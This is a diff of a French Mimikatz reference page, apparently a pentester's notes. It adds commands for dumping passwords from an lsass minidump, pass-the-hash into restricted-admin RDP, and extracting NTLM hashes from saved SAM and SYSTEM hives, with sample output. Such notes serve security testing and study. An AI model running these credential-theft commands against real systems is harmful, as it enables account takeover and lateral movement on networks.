@@ -5,9 +5,59 @@ permalink: /Mimikatz/
 
 # Mimikatz
 
-## Conditions
+## Commandes utiles
 
-Pour utiliser mimikatz il faut pouvoir le lancer en tant qu'administrateur ou SYSTEM. Ensuite on peut récupérer des informations, modulo certaines conditions (https://technet.microsoft.com/en-us/windows-server-docs/security/securing-privileged-access/securing-privileged-access-reference-material#a-nameatltbmaadministrative-tools-and-logon-types):
+Repris de https://github.com/gentilkiwi/mimikatz/wiki
+
+#### Dump offline
+
+``` text
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass.dmp' file for minidump...
+```
+
+#### Pass the hash et RDP
+``` text
+privilege::debug
+sekurlsa::pth /user:heidegger /domain:SHINRA-INC /ntlm:XXXXXXXXXXXXXXXX /run:"mstsc.exe /restrictedadmin"
+```
+
+#### Dump offline de SAM
+Récupérer SAM et system:
+```text
+reg save HKLM\SYSTEM SystemBkup.hiv
+reg save HKLM\SAM SamBkup.hiv
+```
+Dumper les hashs avec mimikatz:
+```text
+mimikatz # lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
+Domain : VM-W7-ULT-X
+SysKey : 74c159e4408119a0ba39a7872e9d9a56
+
+SAMKey : e44dd440fd77ebfe800edf60c11d4abd
+
+RID  : 000001f4 (500)
+User : Administrateur
+LM   :
+NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0
+
+RID  : 000001f5 (501)
+User : Invité
+LM   :
+NTLM :
+
+RID  : 000003e8 (1000)
+User : Gentil Kiwi
+LM   :
+NTLM : cc36cf7a8514893efccd332446158b1a
+```
+
+## Secrets d'authentification en mémoire
+
+Les "logins" suivants provoquent le stockage d'information d'authenficaction en mémoire (https://technet.microsoft.com/en-us/windows-server-docs/security/securing-privileged-access/securing-privileged-access-reference-material#a-nameatltbmaadministrative-tools-and-logon-types):
 
 -   Log on at console
 -   Remote Desktop
@@ -37,14 +87,6 @@ A partir de Windows 8.1 et Windows Server 2012 les mots de passes ne sont plus s
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)
 ```
 
-## Commandes
-
-Pour lancer restricted RDP (il y aura quand même affiché l'utilisateur original dans la fenêtre d'après mais c'est normal) en tant que SHINRA-INC\\heidegger (y compris sur une machine qui n'est pas liée au domaine).
-
-``` bash
-privilege::debug
-sekurlsa::pth /user:heidegger /domain:SHINRA-INC /ntlm:XXXXXXXXXXXXXXXX /run:"mstsc.exe /restrictedadmin"
-```
 
 Références
 ----------
